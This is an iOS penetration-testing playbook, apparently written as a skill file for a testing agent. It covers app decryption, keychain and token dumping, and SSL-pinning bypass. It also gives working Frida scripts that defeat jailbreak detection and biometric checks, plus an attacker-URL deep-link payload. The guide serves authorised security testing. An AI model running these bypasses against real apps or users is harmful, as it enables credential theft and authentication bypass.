# iOS Application Security Testing — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1634 (Data from Mobile Device), T1636 (Credentials from Mobile Device), T1417 (Input Capture), T1409 (Application Process Discovery)
**OWASP Mapping:** MASVS-DATA-STORAGE, MASVS-CRYPTO, MASVS-AUTH, MASVS-NETWORK, MASVS-PLATFORM, MASVS-RESILIENCE
**Severity:** Critical / High / Medium
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: ios-security-v1
category: mobile-security
author: HiveBreach
mitre_attack_id: [T1190, T1634, T1636, T1417, T1409]
owasp_mapping: [MASVS-DATA-STORAGE, MASVS-CRYPTO, MASVS-AUTH, MASVS-NETWORK, MASVS-PLATFORM, MASVS-RESILIENCE]
tags: [ios, ipa, frida, frida-ios-dump, class-dump, dsdump, objection, keychain, nsuserdefaults, ssl-pinning, jailbreak-detection, biometric, deep-link, universal-link, realm, coredata, sqlite]
tools: [frida, frida-ios-dump, objection, class-dump, dsdump, otool, rabin2, ideviceinstaller, bagbak]
environments: [ios]
verification_required: sandbox
```

---

## 1. Detection

### 1.1 IPA Structure

```
target.ipa
  Payload/TargetApp.app/
    TargetApp            # Mach-O main binary (FairPlay encrypted if App Store)
    Info.plist           # CFBundleURLTypes, LSApplicationQueriesSchemes, keys
    Frameworks/          # embedded frameworks
    embedded.mobileprovision
    Assets.car
    CodeResources
```

### 1.2 Testing Environment

```bash
ssh root@<device_ip> "/usr/sbin/frida-server -D"     # jailbroken device
idevice_id -l && frida-ps -Uia
objection patchipa --source target.ipa --codesign-signature "Apple Development: team@example.com"
ideviceinstaller -i target-patched.ipa               # non-jailbroken
iproxy 2222 22 && ssh -p 2222 root@localhost         # SSH over USB
```

### 1.3 App Cracking / Decryption (FairPlay)

```bash
python3 dump.py -l
python3 dump.py -u root -p alpine com.target.app
bagbak --raw TargetApp
otool -l TargetApp | grep -A 4 LC_ENCRYPTION_INFO   # cryptid should be 0 post-dump
```

### 1.4 Static Triage

```bash
unzip -o target.ipa -d ipa/
plutil -p ipa/Payload/*.app/Info.plist | grep -iE "CFBundleURLTypes|CFBundleURLSchemes"
dsdump --objc ipa/Payload/*.app/TargetApp -o headers/
rabin2 -zzq ipa/Payload/*.app/TargetApp | grep -iE "password|secret|api_key|token"
```

---

## 2. Confirmation

### 2.1 Runtime Enumeration with Objection

```bash
objection --gadget com.target.app explore
# REPL: env / ios hooking list classes / ios hooking search classes Auth
# REPL: ios hooking search methods Token
```

### 2.2 Keychain & Preferences

```bash
ios keychain dump
ios nsuserdefaults get
ios plist cat Info.plist
```

### 2.3 Storage Containers

```bash
ios file cat <relative_path>
sqlite connect app_data.db
sqlite execute query "SELECT * FROM accounts"
```

---

## 3. Exploitation

### 3.1 SSL Pinning Bypass

```bash
ios sslpinning disable
frida-trace -U com.target.app -m "*[* *SecTrust*]" -m "*[* *URLSession*]"
```

### 3.2 Jailbreak Detection Bypass

```bash
ios jailbreak disable
ios jailbreak simulate
```

```javascript
if (ObjC.available) {
  var NSFileManager = ObjC.classes.NSFileManager;
  var jbPaths = ["/Applications/Cydia.app", "/usr/sbin/sshd", "/bin/bash",
                 "/private/var/lib/apt", "/var/cache/apt"];
  var orig = NSFileManager['- fileExistsAtPath:'].implementation;
  NSFileManager['- fileExistsAtPath:'].implementation = ObjC.implement(
    orig, function(self, sel, path) {
      var p = ObjC.Object(path).toString();
      for (var i = 0; i < jbPaths.length; i++)
        if (p.indexOf(jbPaths[i]) === 0) return false;
      return orig(self, sel, path);
    });
}
```
```bash
frida -U -f com.target.app -l jb-bypass.js
```

### 3.3 Biometric Authentication Bypass (LAContext)

```javascript
if (ObjC.available) {
  var LAContext = ObjC.classes.LAContext;
  var can = LAContext['- canEvaluatePolicy:error:'].implementation;
  LAContext['- canEvaluatePolicy:error:'].implementation = ObjC.implement(
    can, function(self, sel, policy, error) { return true; });
  var ev = LAContext['- evaluatePolicy:localizedReason:reply:'].implementation;
  LAContext['- evaluatePolicy:localizedReason:reply:'].implementation = ObjC.implement(
    ev, function(self, sel, policy, reason, reply) {
      new ObjC.Block(reply).implementation({ success: true, error: null });
      return true;
    });
}
```
```bash
frida -U -f com.target.app -l la-bypass.js
```

### 3.4 Deep Link Attacks (Custom Schemes)

```bash
plutil -p /tmp/Info.plist | grep -A5 CFBundleURLTypes
xcrun simctl openurl booted 'myapp://debug?action=reset&token=AAAA'
frida-trace -U com.target.app -m "*[AppDelegate application:openURL:options:]"
```

### 3.5 Universal Links (AASA)

```bash
domains=$(plutil -extract com.apple.developer.associated-domains xml1 -o - ent.xml | \
          grep -oE 'applinks:[^<]+' | cut -d: -f2)
for d in $domains; do
  curl -sk "https://$d/.well-known/apple-app-site-association" | jq '.'
done
# Audit for wildcards, over-broad paths, broken exclude ordering
frida-trace -U "TargetApp" -m "*[* *continueUserActivity*]"
```

### 3.6 Insecure Data Storage

| Store | Location | Command |
|---|---|---|
| Keychain | securityd DB | `ios keychain dump` |
| NSUserDefaults | Library/Preferences/*.plist | `ios nsuserdefaults get` |
| Realm | *.realm | `ios hooking search classes Realm` |
| SQLite | Library/*.db | `sqlite connect` |

### 3.7 Privacy Permission Abuse

```bash
rabin2 -zzq ipa/Payload/*.app/TargetApp | grep -iE "CLContactStore|AVCaptureDevice|CLLocation|PHPhotoLibrary"
```

---

## 4. Tool-Specific Guidance

| Tool | Purpose | Key Invocation |
|---|---|---|
| frida / frida-trace | Runtime instrumentation | `frida -U -f pkg -l s.js`, `frida-trace -U pkg -m "*[*Auth* *]"` |
| objection | Exploration REPL | `objection --gadget pkg explore` |
| dsdump | ObjC headers | `dsdump --objc binary -o headers/` |
| rabin2 | Mach-O strings | `rabin2 -zzq binary \| grep -i ...` |
| ideviceinstaller | Install IPAs | `ideviceinstaller -i patched.ipa` |
| iproxy | USB SSH tunnel | `iproxy 2222 22` |
| simctl | Simulator automation | `xcrun simctl openurl booted <scheme>://...` |

---

## 5. PoC Generation

```markdown
## iOS Finding — [FINDING_ID]

**Bundle ID:** com.target.app 1.0.0 (build 12)
**Device:** iPhone 15 Pro, iOS 17.x, jailbroken test unit
**Severity:** High
**MASVS:** MASVS-DATA-STORAGE / MASVS-NETWORK

### Evidence
1. `ios nsuserdefaults get` -> access/refresh token dumped plaintext
2. Burp intercepted POST /oauth/token after `ios sslpinning disable`
3. Attacker app registered `myapp://` + ASWebAuthenticationSession captured code
[Objection REPL transcript + Burp captures]

### Remediation
- Store tokens in Keychain (kSecAttrAccessibleAfterFirstUnlock)
- Enforce certificate pinning in NSURLSessionDelegate
- Validate scheme host/path; prefer app-claimed HTTPS redirects
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Jailbroken test device or patched IPA in isolated lab
- [ ] FairPlay binary decrypted; cryptid verified = 0
- [ ] Keychain dump limited to app access group
- [ ] Biometric/jailbreak bypass reproduced against local test account
- [ ] Deep-link/universal-link payloads verified on simulator + device
- [ ] Traffic interception confirmed end-to-end in Burp with tester CA
- [ ] No production user data accessed; tokens generated in test environment

### Prohibited Actions
- Testing on live production devices
- Distributing decrypted DRM binaries beyond the lab
- Harvesting real user keychain items

---

## 7. CheatSheet

```bash
frida-ps -Uia
python3 dump.py com.target.app
dsdump --objc ipa/Payload/*.app/TargetApp -o headers/
objection --gadget com.target.app explore

# Objection REPL cheat sheet
ios keychain dump
ios nsuserdefaults get
ios sslpinning disable
ios jailbreak disable
sqlite connect app_data.db
ios hooking search methods token

xcrun simctl openurl booted 'myapp://web?url=https://attacker.tld/p'
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | iOS backend API access |
| T1409 | Application Process Discovery | Frida/runtime analysis |
| T1417 | Input Capture | Keyboard/keylogger abuse |
| T1430 | Location Tracking | CLLocation abuse |
| T1634 | Data from Mobile Device | Keychain/plist extraction |
| T1636 | Credentials from Mobile Device | Token/credential theft |
| T1640 | Call Control | Telephony URI abuse |

---

## 9. References

- HackTricks iOS Pentesting: https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting
- OWASP MASTG iOS: https://mas.owasp.org/MASTG/ios/
- Objection: https://github.com/sensepost/objection
- frida-ios-dump: https://github.com/AloneMonkey/frida-ios-dump
- bagbak: https://github.com/ChiChou/bagbak
- dsdump: https://github.com/nicklockwood/dsdump
- Apple Custom URL Schemes: https://developer.apple.com/documentation/xcode/defining-a-custom-url-scheme-for-your-app
- Apple Universal Links (AASA): https://developer.apple.com/documentation/technotes/tn3155-debugging-universal-links
- RFC 8252 (OAuth Native Apps): https://www.rfc-editor.org/rfc/rfc8252
- MITRE ATT&CK Mobile Matrix: https://attack.mitre.org/matrices/enterprise/mobile/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
